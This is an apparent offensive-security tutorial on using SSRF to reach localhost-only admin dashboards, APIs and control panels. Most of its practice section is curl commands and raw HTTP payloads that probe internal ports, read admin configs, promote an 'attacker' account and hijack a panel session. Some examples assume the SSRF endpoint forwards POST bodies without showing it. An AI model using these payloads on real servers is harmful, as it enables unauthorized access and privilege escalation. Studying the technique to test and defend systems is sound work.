# Local Web Interface Exploitation

## Context

The goal of this article is to demonstrate how attackers can exploit Server-Side Request Forgery (SSRF) vulnerabilities to access and abuse local web interfaces, such as admin dashboards and local APIs, on the target server. This guide assumes the reader has an understanding of localhost networking, web service architecture, and SSRF techniques.

## Theory

### Local Web Interfaces and SSRF

Local web interfaces are HTTP services bound to the localhost or 127.0.0.1 addresses and are often intended to be inaccessible from external networks. SSRF vulnerabilities allow attackers to make requests from a vulnerable server to these otherwise hidden internal services, effectively proxying the attacker's requests through the server. Many admin dashboards and APIs that are only accessible via localhost lack significant authentication mechanisms, making them prime targets for SSRF exploitation.

### Attack Surface: Localhost-Only Services

Localhost-only services are those listening on localhost:PORT or 127.0.0.1:PORT. Common examples include admin dashboards, monitoring panels, and internal APIs. By crafting SSRF payloads, attackers can issue requests to these local web interfaces, bypassing network restrictions and exploiting the server's access to locally bound services.

### Abuse Scenarios for Local Web Interfaces

Attackers can access admin dashboards to change configuration settings or escalate privileges. They might also interact with local APIs to perform sensitive actions or exfiltrate data. Additionally, hijacking internal control panels can aid lateral movement within the network and persistence in the compromised environment.

## Practice

### Enumerate Accessible Local Web Interfaces via SSRF

1. Use the following command to send an SSRF payload that probes for an admin dashboard on `localhost:8080`:
   
   ```bash
   curl -X POST http://vulnerable-app/ssrf?url=http://127.0.0.1:8080/admin
   ```

2. Probe for a local API endpoint on port `5000` using:
   
   ```bash
   curl -X POST http://vulnerable-app/ssrf?url=http://localhost:5000/api/status
   ```

   These actions will help identify which local web interfaces are accessible using SSRF.

### Exploit Local Admin Dashboard via SSRF

1. Craft an SSRF payload to access the admin configuration page:

   ```http
   GET /admin/config HTTP/1.1
   Host: 127.0.0.1:8080
   ```

2. Retrieve the admin configuration by sending the payload:

   ```bash
   curl -X POST http://vulnerable-app/ssrf --data-urlencode "url=http://127.0.0.1:8080/admin/config"
   ```

   Successfully executing this will allow access to sensitive configurations or credentials from the local admin dashboard.

### Abuse Local API for Privilege Escalation

1. Prepare an SSRF payload to escalate privileges via a local API:

   ```http
   POST /api/user/promote HTTP/1.1
   Host: localhost:5000
   Content-Type: application/json

   {"user":"attacker","role":"admin"}
   ```

2. Send the SSRF request to promote the attacker account:

   ```bash
   curl -X POST http://vulnerable-app/ssrf --data-urlencode "url=http://localhost:5000/api/user/promote" --data '{"user":"attacker","role":"admin"}'
   ```

   This action will enable the attacker to gain elevated privileges by abusing local API endpoints.

### Hijack Internal Control Panel via SSRF

1. Construct an SSRF payload to log into an internal control panel:

   ```http
   POST /panel/session HTTP/1.1
   Host: 127.0.0.1:9090
   Content-Type: application/x-www-form-urlencoded

   user=attacker&action=login
   ```

2. Execute the SSRF request to hijack the control panel session:

   ```bash
   curl -X POST http://vulnerable-app/ssrf --data-urlencode "url=http://127.0.0.1:9090/panel/session" --data 'user=attacker&action=login'
   ```

   By successfully performing this action, attackers can gain access to internal control panels, facilitating further exploitation.

## Tools

- **curl**
- **Burp Suite** 

These tools are essential for crafting and sending HTTP requests to exploit SSRF vulnerabilities effectively.
